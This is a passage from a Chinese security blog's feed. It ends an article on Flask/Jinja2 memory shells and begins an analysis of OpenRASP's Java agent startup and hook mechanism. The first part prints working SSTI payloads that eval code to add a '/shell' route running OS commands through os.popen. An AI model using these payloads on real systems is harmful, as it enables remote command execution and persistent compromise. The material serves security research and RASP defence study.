&#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>以下是执行结果：</p><p><a href="https://pic.imgdb.cn/item/64d2719f1ddac507cc0e8cf0.jpg" title="image-20230809000443773" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2719f1ddac507cc0e8cf0.jpg" alt="image-20230809000443773"></a></p><p>那当前app对象还能从哪里获取呢？可以从_app_ctx_stack的栈顶元素中获取应用上下文，在应用上下文中有app属性，即是我们需要的app对象：</p><p><a href="https://pic.imgdb.cn/item/64d271b01ddac507cc0eb2f5.jpg" title="image-20230808235717822" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271b01ddac507cc0eb2f5.jpg" alt="image-20230808235717822"></a></p><p>因此payload可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;_app_ctx_stack&#x27;].top.app&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>其实通过以下方式也可以获得当前的app对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure><p>获取当前的request对象和app对象一定不只是这几种方式，大家可以继续补充。</p><h3 id="查杀与检测"><a href="#查杀与检测" class="headerlink" title="查杀与检测"></a>查杀与检测</h3><p>flask&#x2F;jinja2 SSTI漏洞在实际攻防场景其实并不常见，因此个人认为这种内存马只要注意不要出现SSTI漏洞就可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为目前在实习的原因，不像以前一样有很多时间，这篇文章断断续续写了一周，本以为用不了这么长时间。以前觉得内存马相关内容的东西太多了，即使目前写了过万字也感觉有很多的地方有待补充，比如Java内存马的种类还差很多种，以及这些内存马的查杀方式，关于查杀方式目前也只是写了Tomcat-Servlet内存马的 查杀方式。缺失的这些有空再写吧，没办法，这就是懒狗的日常，嘻嘻。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://tttang.com/archive/1775">https://tttang.com/archive/1775</a></p><p><a href="https://xz.aliyun.com/t/11566">https://xz.aliyun.com/t/11566</a></p><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java RASP的一些研究</title>
      <link href="/2023/08/06/JavaRASP/"/>
      <url>/2023/08/06/JavaRASP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近分析了百度开源的OpenRASP这款RASP产品的启动流程及Hook流程（Java RASP部分），感觉自己对于RASP产品有了更深的理解。本篇文章将会以OpenRASP为例，介绍RASP产品的部署、检测原理及bypass方法，并尝试自己完成一个RASP的简单实现——取名为CloseRASP。因为笔者水平有限，因此这篇文章可能干货不多，如有错误或不足，希望师傅们斧正。</p><h2 id="RASP介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h2><p>介绍RASP之前，我们先看看什么是WAF？</p><blockquote><p>WAF（Web 应用程序防火墙）通过过滤和监控 Web 应用程序与互联网之间的 HTTP 流量来帮助保护 Web 应用程序。它通常可以保护 Web 应用程序，使其免受跨站点伪造、跨站点脚本 (XSS)、文件包含、SQL 注入及其他一些攻击的影响。</p></blockquote><p>很多时候我们在进行攻击时遇到的都是基于流量规则对攻击行为进行过滤的WAF，WAF相比RASP误报率高，绕过率高，且市面上也有很多针对不同waf的绕过方式。而RASP是一种运行时应用程序自我保护的技术，全称“Runtime application self-protection”。它是通过JavaAgent利用Instrumentation在指定的class加载之后，调用指定的ClassFileTransformer实现类的transform方法，通过使用ASM（或者其他字节码修改框架）技术来hook目标class的method，在方法的开头或结尾插入检测攻击的代码，之后将hook好的字节码返回给transformer从而加载到JVM中。因此可以说JavaAgent就是Java RASP技术的基础。（建议读者先了解JavaAgent及Javassist再阅读本文）</p><h2 id="OpenRASP研究"><a href="#OpenRASP研究" class="headerlink" title="OpenRASP研究"></a>OpenRASP研究</h2><p>OpenRASP 抛弃了传统防火墙依赖请求特征检测攻击的模式，创造性的使用RASP技术（应用运行时自我保护），直接注入到被保护应用的服务中提供函数级别的实时防护，可以在不更新策略以及不升级被保护应用代码的情况下检测&#x2F;防护未知漏洞，尤其适合大量使用开源组件的互联网应用以及使用第三方集成商开发的金融类应用。我们先看看OpenRASP在Tomcat中是怎样手动安装的：</p><p><a href="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" title="image-20230805164731893" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" alt="image-20230805164731893"></a></p><p>在OpenRASP中除了RaspInstall.jar这个用来安装OpenRASP的jar包外，还有rasp.jar和rasp-engine.jar这两个jar包。可以看到在Tomcat中手动安装OpenRASP的话，需要增加-javaagent项设置为rasp.jar。老惯例，先看看MAINFEST.MF，以下是rasp.jar的MAINFEST.MF文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Build-Time: 2022-01-28T09:49:33Z</span><br><span class="line">Last-Commit-User-Email: CaledoniaProject@users.noreply.github.com</span><br><span class="line">Built-By: root</span><br><span class="line">Premain-Class: com.baidu.openrasp.Agent</span><br><span class="line">Created-By: Apache Maven 3.2.3</span><br><span class="line">Git-Branch: master</span><br><span class="line">Git-Commit: a0634d6</span><br><span class="line">Last-Commit-User-Name: CaledoniaProject</span><br><span class="line">Build-Jdk: 1.6.0_45</span><br><span class="line">Project-Version: 1.3.7</span><br><span class="line">Agent-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Main-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们只关心Premain-Class、Agent-Class、Can-Redefine-Classes、Main-Class和Can-Retransform-Classes这5个配置。可以看到Main-Class是com.baidu.openrasp.Agent，若是执行这个rasp.jar，代码将从com.baidu.openrasp.Agent#main开始。Premain-Class也是com.baidu.openrasp.Agent，因为设置了-javaagent项，因此若运行利用Tomcat部署Web项目时会首先执行com.baidu.openrasp.Agent#premain。Can-Redefine-Classes和Can-Retransform-Classes这两个配置项因为要重新定义class必然设置为true不必说。Agent-Class指定的也是com.baidu.openrasp.Agent，那么当attach目标class的时候就会执行com.baidu.openrasp.Agent#agentmain。</p><h3 id="OpenRASP启动流程分析"><a href="#OpenRASP启动流程分析" class="headerlink" title="OpenRASP启动流程分析"></a>OpenRASP启动流程分析</h3><p>在IDEA调试时，可以在右上角的Tomcat配置中加上VM Options，通过-javaagent项指定rasp.jar。因为配置了<code>-javaagent</code>，因此首先进入com.baidu.openrasp.Agent#premain：</p><p><a href="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" title="image-20230805165633563" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" alt="image-20230805165633563"></a></p><p>跟进init方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" title="image-20230805165926450" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" alt="image-20230805165926450"></a></p><p>以下是JarFileHelper的addJarToBootstrap方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" title="image-20230805170651161" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" alt="image-20230805170651161"></a></p><p>这里通过Instrumentation的<code>appendToBootstrapClassLoaderSearch</code>方法，把rasp.jar包放到Bootstrap ClassLoader的搜索路径。解释一下为什么这样做，因为java的双亲委派机制，我们需要将<code>rasp.jar</code>包加入到了<code>BootStrapClassLoader</code>下，否则当我们需要hook像 java.io.File或者java.lang.ProcessImpl 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，就无法检测到了。因此将 rasp.jar 添加到 <code>BootstrapClassLoader</code> 的ClassPath下，收到类加载委派任务时，就能通过该classpath加载到rasp.jar的所有类了，那么，也就意味着，任何一个类加载器中的任何一个类，都能通过显式或者隐式加载，加载到rasp.jar中的类。</p><p>之后调用了ModuleLoader.load()，这个函数的作用是用来加载和初始化引擎模块，即之前提到的rasp-engine.jar，跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" title="image-20230805171655179" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" alt="image-20230805171655179"></a></p><p>这里创建了一个ModuleLoader实例，继续跟进：</p><p><a href="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" title="image-20230805171740140" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" alt="image-20230805171740140"></a></p><p>从函数名就可以知道这个<code>setStartupOptionForJboss</code>函数是用来为Jboss设置一些起始选项的，跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" title="image-20230805172119071" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" alt="image-20230805172119071"></a></p><p>这里通过获取到系统类加载器加载字节码class的路径后，判断是否有jboss-modules.jar，很明显，我们使用Tomcat没有这个jar包。若判断是Jboss中间件的话，会调用setSystemProperty函数设置相关属性和预加载包：</p><p><a href="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" title="image-20230805172333798" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" alt="image-20230805172333798"></a></p><p>之后继续执行：</p><p><a href="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" title="image-20230805172428128" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" alt="image-20230805172428128"></a></p><p>创建了一个ModuleContainer实例，传入了包名rasp-engine.jar，进入ModuleContainer的构造函数：</p><p><a href="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" title="image-20230805172647805" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" alt="image-20230805172647805"></a></p><p>首先创建一个JarFile对象指向rasp-engine.jar文件，然后获取jar包中的MAINFEST.MF文件中的属性，将Rasp-Module-Name的值赋值给this.moduleName，将Rasp-Module-Class的值赋值给moduleEnterClassName。Rasp-Module-Class的值是com.baidu.openrasp.EngineBoot：</p><p><a href="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" title="image-20230805173137167" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" alt="image-20230805173137167"></a></p><p>之后将com.baidu.openrasp.EngineBoot实例化赋值给this.module：</p><p><a href="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" title="image-20230805173119508" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" alt="image-20230805173119508"></a></p><p>代码中是通过ModuleLoader.moduleClassLoader来加载com.baidu.openrasp.EngineBoot的，而moduleClassLoader在ModuleLoader类中的static块中有所定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader systemClassLoader;</span><br><span class="line"><span class="keyword">for</span>(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != <span class="literal">null</span> &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>); systemClassLoader = systemClassLoader.getParent()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">moduleClassLoader = systemClassLoader;</span><br></pre></td></tr></table></figure><p>扩展类加载器的父类加载器为启动类加载器，即Bootstrap ClassLoader，因此moduleClassLoader是启动类加载器，这里需要记一下。之后ModuleContainer的构造方法结束，继续执行com.baidu.openrasp.ModuleContainer#start，以下是该方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" title="image-20230805173319080" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" alt="image-20230805173319080"></a></p><p>调用了com.baidu.openrasp.EngineBoot的start方法，在该方法中进行了：输出Banner信息，加载V8引擎、初始化插件系统、配置核查、初始化字节码转换模块、初始化云管理模块等操作，我们跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" title="image-20230805173434615" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" alt="image-20230805173434615"></a></p><p>首先输出了Banner，我们可以在运行日志中看到：</p><p><a href="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" title="image-20230805173518945" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" alt="image-20230805173518945"></a></p><p>之后执行了<code>Loader.load();</code>，跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" title="image-20230805174227846" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" alt="image-20230805174227846"></a></p><p><a href="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" title="image-20230805174240220" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" alt="image-20230805174240220"></a></p><p>可以看到，加载了一个JNI库文件。此处完成V8引擎的加载，用于解释执行JavaScript。OpenRasp的一大特色就是将部分规则通过JS插件的形式来实现编写，这样做有两个优势，一是可以实现<strong>跨平台使用</strong>，减少了为不同语言重复制定相同规则的问题。另一个就是可以<strong>实现规则的热部署</strong>，添加或修改规则不需要重新启动服务。接着调用了<code>com.baidu.openrasp.EngineBoot#loadConfig</code>，完成初始化log4j、检查云控配置信息以及读取配置信息，初始化syslog服务连接等操作：</p><p><a href="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" title="image-20230805174833561" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" alt="image-20230805174833561"></a></p><p>接着又执行了<code>JS.Initialize()</code>，跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" title="image-20230805181639916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" alt="image-20230805181639916"></a></p><p>设置v8获取栈信息的getter方法，这里获得的栈信息，每一条信息包括类名、方法名和行号classname@methodname(linenumber)。紧接着是对插件的更新：</p><p><a href="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" title="image-20230805182223918" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" alt="image-20230805182223918"></a></p><p>获取plugins目录下的文件进行过滤，其中要求后缀名为.js，之后获取到合法的plugin文件后，将文件的名字和内容添加到scripts，并执行<code>UpdatePlugin(scripts);</code>，使用V8引擎进行信息的提取。之后调用<code>InitFileWatcher</code>方法来实现对js配置文件的监听事件，从而实现热部署，动态的增删js中的检测规则：</p><p><a href="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" title="image-20230805183104173" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" alt="image-20230805183104173"></a></p><p>紧接着调用<code>CheckerManager.init()</code>：</p><p><a href="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" title="image-20230805183947706" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" alt="image-20230805183947706"></a></p><p>Type类如下：</p><p><a href="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" title="image-20230805184036441" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" alt="image-20230805184036441"></a></p><p>从枚举类com.baidu.openrasp.plugin.checker.CheckParameter.Type中读取所有的checker，包含三种类型的checker，一是js插件检测，意味着这个checker会调用js plugin进行攻击检测，二是java本地检测，意味着是调用本地java代码进行攻击检测，三是安全基线检测，是用于检测一些高风险类的安全性基线检测，检测其配置是否有安全隐患。</p><p>进接着调用<code>this.initTransformer(inst)</code>，跟进：</p><p><a href="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" title="image-20230805184657314" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" alt="image-20230805184657314"></a></p><p>CustomClassTransformer是ClassFileTransformer的实现类，以下是该类的一种构造方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" title="image-20230805184756487" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" alt="image-20230805184756487"></a></p><p>addTransformer()中指定的transfromer为自己，也就是CustomClassTransformer，之后执行addAnnotationHook()：</p><p><a href="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" title="image-20230805185014583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" alt="image-20230805185014583"></a></p><p>这个方法的作用就是扫描com.baidu.openrasp.hook包下有@HookAnnotation注解的类，之后循环调用addHook()方法，将所有不是配置文件中hooks.ignore指定的类型的对象添加到this.hooks中：</p><p><a href="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" title="image-20230805190113349" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" alt="image-20230805190113349"></a></p><p>这个hooks字段是用来提供在后续类加载通过com.baidu.openrasp.transformer.CustomClassTransformer#transform的时候，对其进行匹配，判断是否需要hook。接下来回到com.baidu.openrasp.EngineBoot#initTransformer中，调用了com.baidu.openrasp.transformer.CustomClassTransformer#retransform：</p><p><a href="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" title="image-20230805190139754" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" alt="image-20230805190139754"></a></p><p><a href="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" title="image-20230805190728654" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" alt="image-20230805190728654"></a></p><p>通过调用isClassMatched判断这个类是否是Hook的类：</p><p><a href="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" title="image-20230805190933320" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" alt="image-20230805190933320"></a></p><p>通过迭代this.hooks，调用对应的isClassMatched()方法进行匹配，如果需要hook，则调用retransformClasses()对该class进行重新定义，重新触发对该类的拦截，那我们接下来看一下<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" title="image-20230805224633278" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" alt="image-20230805224633278"></a></p><p>在这里依然不断循环迭代hooks，对class进行匹配，之后调用hook类的transformClass方法：</p><p><a href="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" title="image-20230805225328777" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" alt="image-20230805225328777"></a></p><p>又调用了hookMethod()方法来进行字节码的修改。</p><h3 id="OpenRASP-Hook"><a href="#OpenRASP-Hook" class="headerlink" title="OpenRASP Hook"></a>OpenRASP Hook</h3><p>那接下来，我们挑一个例子来看看OpenRASP的Hook流程，例如com.baidu.openrasp.hook.xxe.XXEHook。我们首先看看com.baidu.openrasp.hook.xxe.XXEHook#isClassMatched，了解一下是如何对需要hook的类做匹配的，该方法如下所示：</p><p><a href="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" title="image-20230805234958546" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" alt="image-20230805234958546"></a></p><p>代码很简单，这里检测是否是可能存在XXE漏洞的类。之后查看<code>com.baidu.openrasp.hook.xxe.XXEHook#hookMethod</code>，看看是怎么更改这些类的代码的：</p><p><a href="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" title="image-20230805235310814" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" alt="image-20230805235310814"></a></p><p>这里通过调用了<code>com.baidu.openrasp.hook.AbstractClassHook#getInvokeStaticSrc</code>方法获取了需要插入到这些类的expandSystemId()和setDescription()方法中的一些代码。getInvokeStaticSrc()如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokeClassName</span> <span class="operator">=</span> invokeClass.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterTypesString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (parameterTypes != <span class="literal">null</span> &amp;&amp; parameterTypes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Class[] arr$ = parameterTypes;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> parameterTypes.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">parameterType</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                <span class="keyword">if</span> (parameterType.getName().startsWith(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + <span class="string">&quot;Class.forName(\&quot;&quot;</span> + parameterType.getName() + <span class="string">&quot;\&quot;),&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + parameterType.getName() + <span class="string">&quot;.class,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parameterTypesString = parameterTypesString.substring(<span class="number">0</span>, parameterTypesString.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameterTypesString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            parameterTypesString = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parameterTypesString = <span class="string">&quot;new Class[]&#123;&quot;</span> + parameterTypesString + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String src;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName + <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大致逻辑就是获取XXEHook类的checkXXE方法的字节码并将其写入到了sink点的运行前，也就是我们上边提到的那两个方法。现在还记得我们之前看到的将jar包添加到BootstrapClassloader的搜索路径的操作吗？注意看getInvokeStaticSrc方法这里在sink点的运行前添加了一段<code>src = &quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot; + invokeClassName + &quot;\&quot;).getMethod(\&quot;&quot; + methodName + &quot;\&quot;,&quot; + parameterTypesString + &quot;).invoke(null&quot;;</code>，moduleClassLoader是BootstrapClassloader，因此当我们在由BootstrapClassloader加载的类中插入这段代码时，这个类就可以加载到了<code>XXXHook</code>中的<code>checkXXX</code>方法来进行检测防御了。在此处就是加载到了XXEHook中的checkXXE方法。</p><p>之后我们跟进一下checkXXX方法看看是怎么对恶意攻击进行防御的，以XXEHOOK的checkXXE方法为例：</p><p><a href="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" title="image-20230806144603157" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" alt="image-20230806144603157"></a></p><p>调用到com.baidu.openrasp.HookHandler#doCheck，之后又调用到com.baidu.openrasp.HookHandler#doCheckWithoutRequest：</p><p><a href="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" title="image-20230806144732533" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" alt="image-20230806144732533"></a></p><p>此处为RASP的熔断开关，当服务器的cpu使用率超过90%，禁用全部hook点 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getDisableHooks()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span 